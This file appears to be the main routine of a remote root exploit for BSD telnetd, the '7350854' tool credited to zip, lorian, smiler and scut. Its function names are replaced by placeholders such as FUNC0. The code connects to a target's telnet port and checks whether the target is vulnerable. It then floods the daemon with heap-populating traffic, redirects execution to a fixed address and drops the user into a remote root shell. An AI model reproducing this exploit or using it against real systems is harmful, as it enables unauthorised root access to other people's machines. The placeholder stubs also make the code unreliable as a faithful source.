#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct timeval {unsigned long tv_sec; } ;

/* Variables and functions */
 int COL ; 
 char EOF ; 
 int /*<<< orphan*/  EXIT_FAILURE ; 
 int /*<<< orphan*/  EXIT_SUCCESS ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ) ; 
 int checkonly ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 scalar_t__ force ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC5 () ; 
 char FUNC6 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC7 (struct timeval*,int /*<<< orphan*/ *) ; 
 int mode ; 
 int FUNC8 (int /*<<< orphan*/ *,char*,int,int) ; 
 int /*<<< orphan*/  num ; 
 int /*<<< orphan*/  optarg ; 
 int pop ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 int /*<<< orphan*/  FUNC10 () ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 int /*<<< orphan*/  FUNC12 (int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC13 (char*) ; 
 int walk ; 
 int /*<<< orphan*/  FUNC14 (int) ; 
 scalar_t__ FUNC15 (int) ; 
 int /*<<< orphan*/  FUNC16 (int) ; 

int
FUNC17 (int argc, char *argv[])
{
        char                    c;
        char *                  progname;
        char *                  dest;
        int                     i, j, fd,
                                dots = 0;
        int                     popc;
        struct timeval          start,
                                cur;
        unsigned long long int  g_pct,  /* gaussian percentage */
                                g_all;  /* gaussian overall */


        FUNC4 (stderr, "7350854 - x86/bsd telnetd remote root\n"
                "by zip, lorian, smiler and scut.\n\n");

        progname = argv[0];
        if (argc < 2)
                FUNC13 (progname);


        while ((c = FUNC6 (argc, argv, "n:cf")) != EOF) {
                switch (c) {
                case 'n':
                        num = FUNC0 (optarg);
                        break;
                case 'c':
                        checkonly = 1;
                        break;
                case 'f':
                        force = 1;
                        break;
                default:
                        FUNC13 (progname);
                        break;
                }
        }

        dest = argv[argc - 1];
        if (dest[0] == '-')
                FUNC13 (progname);

        fd = FUNC8 (NULL, dest, 23, 20);
        if (fd <= 0) {
                FUNC4 (stderr, "failed to connect\n");
                FUNC2 (EXIT_FAILURE);
        }

        FUNC10 ();

        if (FUNC15 (fd) == 0 && force == 0) {
                FUNC9 ("aborting\n");
#ifndef DEBUG
                FUNC2 (EXIT_FAILURE);
#endif
        }
        FUNC1 (fd);

        if (checkonly)
                FUNC2 (EXIT_SUCCESS);

        fd = FUNC8 (NULL, dest, 23, 20);
        if (fd <= 0) {
                FUNC4 (stderr, "failed to connect the second time\n");
                FUNC2 (EXIT_FAILURE);
        }

        FUNC9 ("\n#############################################################################\n\n");
        FUNC9 ("ok baby, times are rough, we send %dmb traffic to the remote\n"
                "telnet daemon process, it will spill badly. but then, there is no\n"
                "other way, sorry...\n\n", mode);

#ifdef DEBUG
        getchar ();
#endif
        FUNC9 ("## setting populators to populate heap address space\n");

        g_all = ((unsigned long long int)(pop / 2)) *
                        ((unsigned long long int)(pop + 1));
        g_pct = 0;

        FUNC9 ("## number of setenvs (dots / network): %d\n", pop);
        FUNC9 ("## number of walks (percentage / cpu): %Lu\n", g_all);
        FUNC9 ("##\n");
        FUNC9 ("## the percentage is more realistic than the dots ;)\n");
        FUNC9 ("\n");
        FUNC9 ("percent |");

        popc = pop / COL;
        for (i = pop / popc ; i >= 0 ; --i)
                FUNC9 ("-");
        FUNC9 ("|      ETA |\n");

        FUNC7 (&start, NULL);

        for (walk = 0 ; walk < pop ; ++walk) {
                FUNC16 (fd);

                g_pct += walk;

                if (walk % popc == 0)
                        dots += 1;

                if (walk % 200 == 0) {
                        int                     pct;
                        float                   pct_f;
                        unsigned long int       diff;

                        pct = (int) ((g_pct * 100) / g_all);
                        pct_f = g_pct * 100;
                        pct_f /= (float) g_all;

                        /* calculate difference not caring about accuracy */
                        FUNC7 (&cur, NULL);
                        diff = cur.tv_sec - start.tv_sec;

                        FUNC9 ((pct == 100) ? "\r%3.2f%% |" : ((pct / 10) ?
                                "\r %2.2f%% |" : "\r  %1.2f%% |"), pct_f);
                        for (j = 0 ; j < dots ; ++j)
                                FUNC9 (".");
                        for ( ; j <= COL ; ++j)
                                FUNC9 (" ");

                        if (pct != 0) {
                                diff = (int) ((((float)(100 - pct_f)) /
                                        (float) pct_f) * diff);
                                FUNC9 ("| %02lu:%02lu:%02lu |",
                                        diff / 3600, (diff % 3600) / 60,
                                        diff % 60);
                        } else {
                                FUNC9 ("| --:--:-- |");
                        }

                        FUNC3 (stdout);
                }
        }
        FUNC9 ("\n\n");

        FUNC9 ("## sleeping for 10 seconds to let the process recover\n");
        FUNC12 (10);

#ifdef DEBUG
        getchar ();
#endif
        /* return into 0x08feff0a */
        FUNC14 (fd);
        FUNC12 (1);

        FUNC9 ("## ok, you should now have a root shell\n");
        FUNC9 ("## as always, after hard times, there is a reward...\n");
        FUNC9 ("\n\ncommand: ");
        FUNC3 (stdout);

        FUNC11 (fd);

        FUNC2 (EXIT_SUCCESS);
}